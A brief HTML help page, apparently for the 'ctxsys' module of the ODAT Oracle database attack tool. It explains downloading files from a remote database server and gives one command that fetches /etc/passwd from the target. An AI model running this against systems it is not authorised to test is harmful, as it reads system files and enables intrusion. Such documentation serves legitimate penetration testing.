<title>ctxsys</title>
</head><body>Download files <br/>
This module can be used to download a file stored on the database server:<br/>
&nbsp;<ul><li>&nbsp;To get the <i>/etc/passwd</i>&nbsp;file of the remote database server:</li>
</ul>
./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd &nbsp;</body></html>
